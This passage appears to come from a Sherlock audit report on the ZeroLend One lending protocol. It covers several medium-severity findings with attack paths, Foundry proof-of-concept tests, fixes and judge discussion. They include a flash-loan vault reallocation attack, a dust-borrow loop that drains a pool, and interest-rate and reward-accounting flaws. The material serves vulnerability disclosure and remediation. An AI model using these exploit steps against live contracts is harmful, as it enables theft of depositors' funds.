        pool.liquidateSimple(address(tokenA), address(tokenB), pos, supplyAmountA);
  }
  ```
  You can add the test to `PoolLiquidationTests.t.sol`
  
Add the following log in `LiquidationLogic.executeLiquidationCall()`:
```diff
  // Transfer fee to treasury if it is non-zero
    if (vars.liquidationProtocolFeeAmount != 0) {
      uint256 liquidityIndex = collateralReserve.getNormalizedIncome();
      uint256 scaledDownLiquidationProtocolFee = vars.liquidationProtocolFeeAmount.rayDiv(liquidityIndex);
      uint256 scaledDownUserBalance = balances[params.collateralAsset][params.position].supplyShares;

      if (scaledDownLiquidationProtocolFee > scaledDownUserBalance) {
        vars.liquidationProtocolFeeAmount = scaledDownUserBalance.rayMul(liquidityIndex);
      }

+    console.log("Fee amount to transfer %e", vars.liquidationProtocolFeeAmount);

      IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);
    }
```
    
**Console output**:
 ```bash
[PASS] testJ_fullLiquidation() (gas: 945182)
Logs:
Fee amount to transfer 0e0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.35ms (1.89ms CPU time)

Ran 1 test suite in 12.09ms (5.35ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

Also it requires the fix from https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/228 to be applied, because otherwise the collateral balance of the user is not reduced by the correct amount.

# Issue M-8: A malicious user can re-allocate vault funds into a pool that is about to experience bad debt to cause significant loss for the vault 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/282 

## Found by 
Obsidian
### Summary

An attacker can use flash loans to re-allocate the funds of any vault into whichever pools they choose, this is best described in a set of steps.

Assume a vault deposits into pools A, B and C. Assume each pool has a cap of 60 ETH. The deposit queue is [A,B,C]. The withdraw queue is [A,B,C]. Note that all these numbers and orders are 100% arbitrary, the attack can be performed for any variation or caps/order.

Currently the allocations are as follows:

Pool A has 20 ETH deposited
Pool B has 20 ETH deposited
Pool C has 20 ETH deposited

Here is how the attacker can re-allocate all the funds into Pool C:

1. Attacker takes a flash loan of 120 ETH
2. Attacker [deposits](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVault.sol#L322) 40 ETH into the vault, this will fill the cap for Pool A
3. Attacker deposits 40 ETH into the vault, this will fill the cap for Pool B
4. Attacker deposits 40 ETH into the vault, this will fill the cap for Pool C
5. Attacker withdraws 120 ETH, this will pull 60 from pool A and 60 from pool B
6. Attacker repays the 120 ETH flash loan (no fees since it was from balancer/maker)

Here is the allocation after the attack:

Pool A has 0 ETH deposited
Pool B has 0 ETH deposited
Pool C has 60 ETH deposited

The issue occurs when a pool is about to be in bad debt, an attacker can re-allocate all the vault's funds into the pool that will experience bad debt to cause a severe loss to the depositors.

### Root Cause

Anybody can use flash loans to arbitrarily reallocate vault allocations.

### Internal pre-conditions

Any pool supplied by vault is about to experience bad debt

### External pre-conditions

_No response_

### Attack Path

1. Attacker is observing the mempool looking for any pool that is deposited to from a vault, that has accumulated bad debt BUT not realised it yet 
2. Attacker re-allocates the vault’s funds into the bad debt pool using flash loans
3. When the bad debt is realised the vault depositors will experience a huge loss

### Impact

Vault depositors experience a severe loss since their funds were re allocated into a pool that experienced bad debt

Another point to note is that bad debt is not socialised in the protocol, this makes the impact even more severe if other pool suppliers withdraw first leaving the vault depositors with nothing

### PoC

_No response_

### Mitigation

_No response_



## Discussion

**sherlock-admin4**

1 comment(s) were left on this issue during the judging contest.

**Honour** commented:
>  Invalid: Claims order doesn't matter but from the details the pool must be the last pool in the withdraw queue and must be about to experience bad debt . very unlikely 



# Issue M-9: Small amount of borrow can drain pool 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/291 

## Found by 
0xMax1mus, almurhasan, dany.armstrong90, danzero, oxelmiguel
### Summary

A user can supply some amount of a token and borrow a small amount of a token from the pool and withdraw the initial amount they supplied without repaying the borrowed amount which could cause insolvency for the pool.

### Root Cause

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ValidationLogic.sol#L124
The `validateBorrow` function In `ValidationLogic.sol` is used to validate borrow request from the user, currently it only requires that the borrowed amount is not 0, this allows user to borrow a minuscule amount of token.

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ValidationLogic.sol#L239
The `validateHealthFactor` function in `ValidationLogic.sol` validate the requested amount of withdrawal from the user corresponding to the health factor.  The `healthFactor` variable returned from the `GenericLogic.calculateUserAccountData` function is compared with the `HEALTH_FACTOR_LIQUIDATION_THRESHOLD`  to be bigger or equal or else it reverts with an error. 

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L69
Inside the `calculateUserAccountData` function the `vars.totalDebtInBaseCurrency` variable determines the `healthFactor` variable. The `vars.totalDebtInBaseCurrency` variable is increased by the `_getUserDebtInBaseCurrency` function. 

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L184
Inside this function the `usersTotalDebt` variable is divided by the  `assetUnit` variable which is fetched from the reserve configuration of the asset. This is a problem if the `assetUnit` is bigger than the `usersTotalDebt` as it will amount to 0 in the end which would set the `healthFactor` variable to `type(uint256).max` which would allow the user to withdraw the initial amount that is supplied while still keeping the borrowed amount.

### Internal pre-conditions

1. Reserve Configuration of the asset needs to be borrowable :
- frozen: false
- borrowable: true

### External pre-conditions

1. At least 1 user needs to supply the token in the pool for an attacker to exploit this vulnerability.

### Attack Path

1. User 1 supply 1e18 wei of token A
2. Attacker supply 1e13 wei of token A at position index 0
3. Attacker borrow 1e9*9 wei of token A at position index 0
4. Attacker withdraw initial supplied amount of token A at position index 0
5. Attacker repeat step 2 - 4 for possibly thousands of times at incrementing position index (1,2,3....) 
6. User 1 withdraw initial supplied amount of token A (Revert error)

### Impact

- Pool insolvency
- Loss of funds for users
- Reputational damage for the protocol

### PoC

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import {MintableERC20} from '../../../../contracts/mocks/MintableERC20.sol';
import {PoolEventsLib, PoolSetup} from '../../core/pool/PoolSetup.sol';
import {console2} from '../../../../lib/forge-std/src/console2.sol';
import {stdError} from '../../../../lib/forge-std/src/StdError.sol';
import {DataTypes} from '../../../../contracts/core/pool/configuration/DataTypes.sol';
import {ReserveConfiguration} from '../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';

contract mytest is PoolSetup {
  function setUp() public {
    _setUpPool();

    console2.log('This:', address(this));
    console2.log('msg.sender:', address(msg.sender));
    console2.log('owner:', address(owner));
    console2.log('whale:', address(whale));
    console2.log('ant:', address(ant));
    console2.log('governance:', address(governance));
  }

  function testSmallBorroWithdraw() external {
    
    uint256 index = 0;
    pos = keccak256(abi.encodePacked(address(owner), 'index', uint256(index)));
    uint256 mintAmount = 5 ether;

    tokenA.mint(owner, mintAmount);
    tokenA.mint(whale, mintAmount);
    tokenA.mint(ant, mintAmount);

    vm.startPrank(owner);
    tokenA.approve(address(pool), mintAmount * 1e9);

    vm.startPrank(ant);
    tokenA.approve(address(pool), mintAmount * 1e9);

    vm.startPrank(whale);
    tokenA.approve(address(pool), mintAmount * 1e9);

    console2.log('Owner Balance: ', tokenA.balanceOf(owner));
    console2.log('Ant Balance: ', tokenA.balanceOf(ant));
    console2.log('Whale Balance: ', tokenA.balanceOf(whale));
    console2.log('Pool Balance: ', tokenA.balanceOf(address(pool)));

    vm.startPrank(whale);
    pool.supplySimple(address(tokenA), whale, mintAmount, index);
    // pool.borrowSimple(address(tokenA), whale, mintAmount/2, index);
    // pool.withdrawSimple(address(tokenA), whale, mintAmount, index);

    vm.startPrank(owner);

    //Why only 4000 ? Avoid out of gas error, there could be a way to bypass this in foundry but due to time constraint, this is the best POC for now...
    for(uint i = 0; i < 4000; i++){
      pool.supplySimple(address(tokenA), owner, mintAmount, index+i);
      pool.borrowSimple(address(tokenA), owner, 1e9*9, index+i);
      pool.withdrawSimple(address(tokenA), owner, mintAmount, index+i);

      // console2.log(i);

    }

    // pool.borrowSimple(address(tokenA), owner, 1e9, index);

    // vm.startPrank(ant);
    // pool.supplySimple(address(tokenA), ant, mintAmount, index);
    // pool.borrowSimple(address(tokenA), ant, 1e9*9, index);
    // // pool.repaySimple(address(tokenA), 1e9*9, index);
    // pool.withdrawSimple(address(tokenA), ant, mintAmount, index);

    console2.log('Owner Debt: ', pool.getDebt(address(tokenA), owner, 0));
    // console2.log('Ant Debt: ', pool.getDebt(address(tokenA), ant, 0));

    console2.log('Owner Balance: ', tokenA.balanceOf(owner));
    // console2.log('Ant Balance: ', tokenA.balanceOf(ant));
    console2.log('Whale Balance: ', tokenA.balanceOf(whale));
    console2.log('Pool Balance: ', tokenA.balanceOf(address(pool)));

    vm.startPrank(whale);
    pool.withdrawSimple(address(tokenA), owner, mintAmount, index); //[FAIL. Reason: panic: arithmetic underflow or overflow (0x11)]

  }
}

```

### Mitigation

Fix the require statement in  `validateBorrow` function In `ValidationLogic.sol` such that it the minimum borrowed amount depends on the decimals of the asset borrowed. An attacker can get away borrowing 1e9 of an asset with 1e18 decimal but fails when it tries to borrow 1e10, hence the require statement could be something like "minimum borrow amount needs to be 8 decimal difference to the asset decimal". Could be something like this:

```solidity
uint256 minAmount = 10 ** params.cache.reserveConfiguration.getDecimals() / 1e8;
require(params.amount >= minAmount, PoolErrorsLib.INVALID_AMOUNT);
```



## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**Honour** commented:
>  Possibly invalid along with dupes #137 #148 #390. Code is a fork of AAVE and aave doesn't implement a min. borrow. Cant't drain pool as it would require 10^9 (txs/ loops in a single tx) to borrow 1e18 token worth of debt. it's difficult to say how much can actually be borrowed using this.



# Issue M-10: After a User withdraws The interest Rate is not updated accordingly leading to the next user using an inflated index during next deposit before the rate is normalized again 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/387 

## Found by 
A2-security, Bigsam, Obsidian, iamnmt
### Summary

A bug in Zerolend's withdrawal mechanism causes the interest rate to not be updated when funds are transferred to the treasury during a withdrawal. This failure leads to the next user encountering an inflated interest rate when performing subsequent actions like deposit, withdrawal or borrow before the rate is normalized again. The issue arises because the liquidity in the pool drops due to the funds being transferred to the treasury, but the system fails to update the interest rate to reflect this change.

### Root Cause

Examples of update rate before transferring everywhere in the protocol to maintain Rate 

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L69-L81

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L125-L146

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L88-L99

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L139-L158

The same process can be observed in Aave v 3.

1. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L130
2. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L65
3. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/BorrowLogic.sol#L145-L150
4.  https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/BorrowLogic.sol#L227-L232

Looking at the effect of updating rate 

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L134-L182

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/periphery/ir/DefaultReserveInterestRateStrategy.sol#L98-L131

This rates are used to get the new index

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L225-L227

https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L235-L237

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

In the current implementation of Zerolend, during a **withdrawal**, the protocol transfers a portion of the funds to the **treasury**. However, it does not update the interest rate before this transfer has being done for all transfers, leading to an **inflated liquidity rate** being used by the next user, particularly for deposits. This is problematic as the next user deposits/withdraws at a rate that is incorrectly high, causing them to receive fewer shares than they should.

In comparison, Aave mints shares to the treasury, which can later withdraw this funds like any other user. 

Each withdrawal out of the contract in underlying asset **in Aave** updates the interest rate, ensuring the rates reflect the true liquidity available in the pool.

 Zerolend's approach of transferring funds directly upon every user withdrawal fails to adjust the interest rate properly, resulting in a temporary discrepancy that affects subsequent users.

#### Code Context:

In the **`executeMintToTreasury`** function, the accrued shares for the treasury are transferred, but the interest rates are not updated to account for the change in liquidity.

```solidity
function executeMintToTreasury(
    DataTypes.ReserveSupplies storage totalSupply,
    mapping(address => DataTypes.ReserveData) storage reservesData,
    address treasury,
    address asset
  ) external {
    DataTypes.ReserveData storage reserve = reservesData[asset];

    uint256 accruedToTreasuryShares = reserve.accruedToTreasuryShares;

    if (accruedToTreasuryShares != 0) {
      reserve.accruedToTreasuryShares = 0;
      uint256 normalizedIncome = reserve.getNormalizedIncome();
      uint256 amountToMint = accruedToTreasuryShares.rayMul(normalizedIncome);

@audit>> no interest rate update before fund removal >>       IERC20(asset).safeTransfer(treasury, amountToMint);

      totalSupply.supplyShares -= accruedToTreasuryShares;

      emit PoolEventsLib.MintedToTreasury(asset, amountToMint);
    }
  }
```

As can be seen in this snippet, the funds are transferred to the treasury, but the function does not invoke any interest rate update mechanism. The liquidity in the pool decreases, but the next user's deposit will use an inflated rate due to this oversight.

#### Interest Rate Update Example (Correct Flow):

In other parts of the code, such as during withdrawals, the interest rate is properly updated when liquidity changes:

```solidity

 function executeWithdraw(
    mapping(address => DataTypes.Res

---------------------------------------
reserve.updateInterestRates(
  totalSupplies,
  cache,
  params.asset,
  IPool(params.pool).getReserveFactor(),
  0,  // No liquidity added
  params.amount,  // Liquidity taken during withdrawal
  params.position,
  params.data.interestRateData
);
```

The **`updateInterestRates`** function correctly calculates the new interest rate based on the changes in liquidity, ensuring the system uses accurate rates for subsequent operations.

#### Example of Problem:

Consider the following scenario:
- A user withdraws a portion of funds, which triggers the transfer of some assets to the treasury.
- The liquidity in the pool drops, but the interest rate is not updated.
- The next user deposits into the pool using the **inflated liquidity rate**, resulting in fewer shares being minted for them.

Since the actual liquidity is lower than the interest rate assumes, the user depositing gets fewer shares than expected.

---

### Impact

- **Incorrect Share Calculation**: Users depositing after a treasury withdrawal will receive fewer shares due to an artificially high liquidity rate than the appropriate one , leading to loss of potential value.

### PoC

_No response_

### Mitigation

The mitigation involves ensuring that the **interest rate** is properly updated **before** transferring funds to the treasury. The rate update should account for the liquidity being transferred out, ensuring the new rates reflect the actual available liquidity in the pool.

#### Suggested Fix:

In the **`executeMintToTreasury`** function, call the **`updateInterestRates`** function **before** transferring the assets to the treasury. This will ensure that the interest rate reflects the updated liquidity in the pool before the funds are moved.

##### Modified Code Example:

```solidity
function executeMintToTreasury(
    DataTypes.ReserveSupplies storage totalSupply,
    mapping(address => DataTypes.ReserveData) storage reservesData,
    address treasury,
    address asset
  ) external {
    DataTypes.ReserveData storage reserve = reservesData[asset];

    uint256 accruedToTreasuryShares = reserve.accruedToTreasuryShares;

    if (accruedToTreasuryShares != 0) {
      reserve.accruedToTreasuryShares = 0;
      uint256 normalizedIncome = reserve.getNormalizedIncome();
      uint256 amountToMint = accruedToTreasuryShares.rayMul(normalizedIncome);

++     // Update the interest rates before transferring to the treasury
++      reserve.updateInterestRates(
++        totalSupply,
++       DataTypes.ReserveCache({}), // Supply necessary cache data
++        asset,
++       IPool(asset).getReserveFactor(),
++        0, // No liquidity added
++       amountToMint, // Liquidity taken corresponds to amount sent to treasury
++        bytes32(0), // Position details (if any)
++       new bytes(0) // Interest rate data (if any)
++      );

      IERC20(asset).safeTransfer(treasury, amountToMint);
      totalSupply.supplyShares -= accruedToTreasuryShares;

      emit PoolEventsLib.MintedToTreasury(asset, amountToMint);
    }
  }
```

In this updated version, the interest rates are recalculated to account for the **liquidity sent** to the treasury. This ensures that the **next user's deposit** uses a correctly updated interest rate.

---



## Discussion

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**Honour** commented:
>  Possibly valid. However claims the rates are inflated which i believe is false and the opposite happens( deflated rates) this is because the pool balance will be higher at the time interest rates are calculated (hence lower utilization and lower rates)



**nevillehuang**

request poc

**sherlock-admin4**

PoC requested from @Tomiwasa0

Requests remaining: **15**

**Tomiwasa0**

1. After setting Flashloan premium to 0.09%

2. Import to the WithdrawtTEST

```solidity
++ import {IPool} from './../../../../contracts/interfaces/pool/IPool.sol';
++ import {MockFlashLoanSimpleReceiver} from './../../../../contracts/mocks/MockSimpleFlashLoanReceiver.sol';

contract PoolWithdrawTests is PoolSetup {
++   address alice = address(1);
++  address bob = address(2);

  
++  event Transfer(address indexed from, address indexed to, uint256 value);
```

3. PASTE AND RUN THE POC
```solidity
function _generateFlashloanCondition() internal {
    // Mint and approve tokenA and tokenC for bob
    _mintAndApprove(bob, tokenA, 60 ether, address(pool));
    _mintAndApprove(bob, tokenC, 2500 ether, address(pool));

    // Start prank as bob to simulate transactions from bob's account
    vm.startPrank(bob);

    // Supply tokenC to the pool for bob
    pool.supplySimple(address(tokenC), bob, 1000 ether, 0);

    // Stop prank as bob
    vm.stopPrank();
}
```

### Updated `testPoolWithdraw` Function:
```solidity
function testPoolWithdraw() external {
    // Declare amounts for supply, mint, withdraw, and borrow
    uint256 supplyAmount = 60 ether;
    uint256 mintAmount = 150 ether;
    uint256 withdrawAmount = 10 ether;
    uint256 index = 1;
    uint256 borrowAmount = 20 ether;

    // Mint and approve tokenA for owner
    vm.startPrank(owner);
    tokenA.mint(owner, mintAmount);
    tokenA.approve(address(pool), supplyAmount);

    // Supply tokenA to the pool for owner
    pool.supplySimple(address(tokenA), owner, supplyAmount, index);

    // Assert the balances after supplying tokenA
    assertEq(tokenA.balanceOf(address(pool)), supplyAmount, 'Pool Balance Supply');
    assertEq(tokenA.balanceOf(owner), mintAmount - supplyAmount, 'Owner Balance Supply');
    assertEq(pool.getTotalSupplyRaw(address(tokenA)).supplyShares, supplyAmount);
    assertEq(pool.getBalanceRaw(address(tokenA), owner, index).supplyShares, supplyAmount);

    // Advance time by 100 seconds
    uint256 currentTime1 = block.timestamp;
    vm.warp(currentTime1 + 100);

    // Borrow tokenA
    pool.borrowSimple(address(tokenA), owner, borrowAmount, 1);
    assertEq(tokenA.balanceOf(address(pool)), supplyAmount - borrowAmount);
    assertEq(pool.getDebt(address(tokenA), owner, 1), borrowAmount);
    assertEq(pool.totalDebt(address(tokenA)), borrowAmount);

    vm.stopPrank();

    // Advance time by 50 seconds
    uint256 currentTime2 = block.timestamp;
    vm.warp(currentTime2 + 50);

    // Prepare and execute flash loan
    bytes memory emptyParams;
    MockFlashLoanSimpleReceiver mockFlashSimpleReceiver = new MockFlashLoanSimpleReceiver(pool);
    _generateFlashloanCondition();

    uint256 premium = poolFactory.flashLoanPremiumToProtocol();

    vm.startPrank(alice);
    tokenA.mint(alice, 10 ether);

    // Expect flash loan event emission
    vm.expectEmit(true, true, true, true);
    emit PoolEventsLib.FlashLoan(address(mockFlashSimpleReceiver), alice, address(tokenA), 40 ether, (40 ether * premium) / 10_000);
    emit Transfer(address(0), address(mockFlashSimpleReceiver), (40 ether * premium) / 10_000);

    // Execute the flash loan
    pool.flashLoanSimple(address(mockFlashSimpleReceiver), address(tokenA), 40 ether, emptyParams);
    vm.stopPrank();

    // Advance time by 200 seconds
    uint256 currentTime = block.timestamp;
    vm.warp(currentTime + 200);

    // Assert the pool's balance after withdrawal
    assertEq(tokenA.balanceOf(address(pool)), 40036000000000000000, 'Pool Balance Withdraw');

    // Withdraw tokenA from the pool for the owner
    vm.startPrank(owner);
    pool.withdrawSimple(address(tokenA), owner, withdrawAmount, index);

    // Advance time by 50 seconds
    uint256 currentTime3 = block.timestamp;
    vm.warp(currentTime3 + 50);

    // Assert the remaining balance after withdrawal
    assertEq(pool.getBalanceRaw(address(tokenA), owner, index).supplyShares, 50000001310612529086);

    // Bob mints and supplies more tokenA
    vm.startPrank(bob);
    tokenA.mint(owner, mintAmount);
    tokenA.approve(address(pool), supplyAmount);
    pool.supplySimple(address(tokenA), bob, 60 ether, index);

    // Assert the balance after Bob's supply
    assertEq(pool.getBalanceRaw(address(tokenA), bob, index).supplyShares, 59999989872672182169);
}
```
Before Updating the index with Amount minted to tresury 
Bob got - 59999989872672182169;
After update -  59999989869411349179,

```solidity
Failing tests:
Encountered 1 failing test in test/forge/core/pool/PoolWithdrawTests.t.sol:PoolWithdrawTests
[FAIL. Reason: assertion failed: 59999989869411349179 != 59999989872672182169] testPoolWithdraw() (gas: 1531924)

Encountered a total of 1 failing tests, 0 tests succeeded
```

4. I agree with the initial statement that the impact is a deflation, Apologies for the confusion i calculated this on paper initially and a tiny error was made. 
5. The attacker will mint more shares than they should and this can be weaponised to game the system for some profit by an attacker who just need to simply wait for a withdraw and then deposit lots of funds. 
6. Since DefaultReserveInterestRateStrategy uses IERC20(params.reserve).balanceOf(msg.sender). Attacker gains more amount than they should when the new rate is normalised.

# Issue M-11: The rewards distribution in the NFTPositionManager is unfair 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393 

## Found by 
000000, 0xNirix, A2-security, ether\_sky, iamnmt
## Summary
In `NFTPositionManager`, users can `deposit` or `borrow` `assets` and earn `rewards` in `zero`.
However, the distribution of these `rewards` is not working correctly.
## Vulnerability Detail
Let's consider a `pool`, `P`, and an `asset`, `A`, with a current `liquidity index` of `1.5`.
- Two users, `U1` and `U2`, each `deposit` `100` units of `A` into `pool` `P`. (Think of `U1` and `U2` as `token IDs`.)
- Let's define `assetHash(P, A, false)` as `H`.
- In the `_supply` function, the `balance` is `100`, since it represents the `asset amount`, not `shares` (as seen in `line 57`).
```solidity
function _supply(AssetOperationParams memory params) internal nonReentrant {
  pool.supply(params.asset, address(this), params.amount, params.tokenId, params.data);

57:  uint256 balance = pool.getBalance(params.asset, address(this), params.tokenId);
  _handleSupplies(address(pool), params.asset, params.tokenId, balance);
}
```
- The `shares` for these users would be calculated as `100 ÷ 1.5 = 66.67 shares` each in the `P`.

Now, in the `_handleSupplies` function, we compute the `total supply` and `balances` for these users for the `assetHash` `H`.
```solidity
function _handleSupplies(address pool, address asset, uint256 tokenId, uint256 balance) internal {
  bytes32 _assetHash = assetHash(pool, asset, false);  // H
  uint256 _currentBalance = _balances[tokenId][_assetHash];  // 0
  
  _updateReward(tokenId, _assetHash);
  _balances[tokenId][_assetHash] = balance; // 100
  _totalSupply[_assetHash] = _totalSupply[_assetHash] - _currentBalance + balance;
}
```
Those values would be as below:
- Total supply: `totalSupply[H] = 200`
- Balances: `_balances[U1][H] = _balances[U2][H] = 100`
#### After some time:

- The `liquidity index` increases to `2`.
- A new user, `U3`, `deposits` `110` units of `A` into the `pool` `P`.
- `U2` makes a small `withdrawal` of just `1 wei` to trigger an update to their `balance`.

Now, the `total supply` and user `balances` for `assetHash` `H` become:

- `_balances[U1][H] = 100`
- `_balances[U2][H] = 100 ÷ 1.5 × 2 = 133.3`
- `_balances[U3][H] = 110`
- `totalSupply[H] = 343.3`

At this point, User `U1`’s `asset balance` in the `pool P` is the largest, being `1 wei` more than `U2`'s and `23.3` more than `U3`'s. 
Yet, `U1` receives the smallest `rewards` because their `balance` was never updated in the `NFTPositionManager`. 
In contrast, User `U2` receives more `rewards` due to the `balance` update caused by `withdrawing` just `1 wei`.

### The issue:

This system is unfair because:

- User `U3`, who has fewer `assets` in the `pool` than `U1`, is receiving more `rewards`.
- The `rewards` distribution favors users who perform frequent updates (like `deposits` o `withdrawals`), which is not equitable.

### The solution:

Instead of using the `asset balance` as the `rewards` basis, we should use the `shares` in the `pool`. 
Here’s how the updated values would look:

- `_balances[U1][H] = 66.67`
- `_balances[U2][H] = 66.67 - 1 wei`
- `_balances[U3][H] = 110 ÷ 2 = 55`
- `totalSupply[H] = 188.33`

This way, the `rewards` distribution becomes fair, as it is based on actual contributions to the `pool`.
## Impact

## Code Snippet
https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L57-L58
## Tool used

Manual Review

## Recommendation
```solidity
function _supply(AssetOperationParams memory params) internal nonReentrant {
  pool.supply(params.asset, address(this), params.amount, params.tokenId, params.data);

-  uint256 balance = pool.getBalance(params.asset, address(this), params.tokenId);
+  uint256 balance = pool.getBalanceRaw(params.asset, address(this), params.tokenId).supplyShares;

  _handleSupplies(address(pool), params.asset, params.tokenId, balance);
}
```
The same applies to the `_borrow`, `_withdraw`, and `_repay` functions.



## Discussion

**nevillehuang**

request poc

Is there a permisionless update functionality?

**sherlock-admin4**

PoC requested from @etherSky111

Requests remaining: **25**

**etherSky111**

Thanks for judging.

There is a clear issue. 
https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473
To test this issue properly, we need to resolve the above issue first.
```solidity
function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {
-  uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);
-  return self.supplyShares + increase;
- 
+  return self.supplyShares.rayMul(index);
}
```

Below is test code.
```solidity
function supplyForUser(address user, uint256 supplyAmount, uint256 tokenId, bool mintNewToken) public {
  uint256 mintAmount = supplyAmount;
  DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));
  INFTPositionManager.AssetOperationParams memory params =
    INFTPositionManager.AssetOperationParams(address(tokenA), user, supplyAmount, tokenId, data);

  _mintAndApprove(user, tokenA, mintAmount, address(nftPositionManager));

  vm.startPrank(user);
  if (mintNewToken == true) {
    nftPositionManager.mint(address(pool));
  }
  nftPositionManager.supply(params);
  vm.stopPrank();
}

function borrowForUser(address user, uint256 borrowAmount, uint256 tokenId) public {
  DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));
  INFTPositionManager.AssetOperationParams memory params =
    INFTPositionManager.AssetOperationParams(address(tokenA), user, borrowAmount, tokenId, data);

  vm.startPrank(user);
  nftPositionManager.borrow(params);
  vm.stopPrank();
}

function testRewardDistribution() external {
  DataTypes.ReserveData memory reserveData_0 = pool.getReserveData(address(tokenA));
  console2.log('initial liquidity index                => ', reserveData_0.liquidityIndex);

  address U1 = address(11);
  address U2 = address(12);
  address U3 = address(13);
  
  /**
    User U1 wants to mint a new NFT (tokenId = 1) and supply 100 ether token
    */
  supplyForUser(U1, 100 ether, 1, true);
  /**
    User U2 wants to mint a new NFT (tokenId = 2) and supply 100 ether token
    */
  supplyForUser(U2, 100 ether, 2, true);

  bytes32 assetHash = nftPositionManager.assetHash(address(pool), address(tokenA), false);

  uint256 balancesOfU1 = nftPositionManager.balanceOfByAssetHash(1, assetHash);
  uint256 balancesOfU2 = nftPositionManager.balanceOfByAssetHash(2, assetHash);
  console2.log('initial balance of U1 for rewards      => ', balancesOfU1);
  console2.log('initial balance of U2 for rewards      => ', balancesOfU2);

  /**
    For testing purposes, Alice mints a new NFT (tokenId = 3), supplies 1000 ether, and borrows 600 Ether. 
    This action increases the pool's liquidity rate to a non-zero value.
    */
  supplyForUser(alice, 1000 ether, 3, true);
  borrowForUser(alice, 600 ether, 3);

  DataTypes.ReserveData memory reserveData_1 = pool.getReserveData(address(tokenA));
  console2.log('current liquidity rate                 => ', reserveData_1.liquidityRate);

  /**
    Skipping 2000 days is done for testing purposes to increase the liquidity index. 
    In a real environment, the liquidity index would increase continuously over time.
    */
  vm.warp(block.timestamp + 2000 days);

  pool.forceUpdateReserve(address(tokenA));
  DataTypes.ReserveData memory reserveData_2 = pool.getReserveData(address(tokenA));
  console2.log('updated liquidity index                => ', reserveData_2.liquidityIndex);

  /**
    User U2 supplies 100 wei (a dust amount) to trigger an update of the balances for rewards.
    */
  supplyForUser(U2, 100, 2, false);

  uint256 balancesOfU1Final = nftPositionManager.balanceOfByAssetHash(1, assetHash);
  uint256 balancesOfU2Final = nftPositionManager.balanceOfByAssetHash(2, assetHash);
  console2.log('final balance of U1 for rewards        => ', balancesOfU1Final);
  console2.log('final balance of U2 for rewards        => ', balancesOfU2Final);

  /**
    User U3 wants to mint a new NFT (tokenId = 4) and supply 110 ether token
    */
  supplyForUser(U3, 110 ether, 4, true);
  uint256 balancesOfU3Final = nftPositionManager.balanceOfByAssetHash(4, assetHash);
  console2.log('final balance of U3 for rewards        => ', balancesOfU3Final);
}
```

Everything is in below log:
```solidity
initial liquidity index                =>  1000000000000000000000000000
initial balance of U1 for rewards      =>  100000000000000000000
initial balance of U2 for rewards      =>  100000000000000000000
current liquidity rate                 =>  43490566037735849056603774
updated liquidity index                =>  1238304471439648487981390542
final balance of U1 for rewards        =>  100000000000000000000
final balance of U2 for rewards        =>  123830447143964848898
final balance of U3 for rewards        =>  110000000000000000000
```

There is no `reward system` that requires users to continuously update their `balances`. 
How can users realistically update their `balances` every second to receive accurate `rewards`? 
Is this practical?

# Issue M-12: Position Risk Management Functionality Missing in Position Manager and dos in certain conditions 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/398 

## Found by 
0xc0ffEE, A2-security, almurhasan, tallo
## Summary
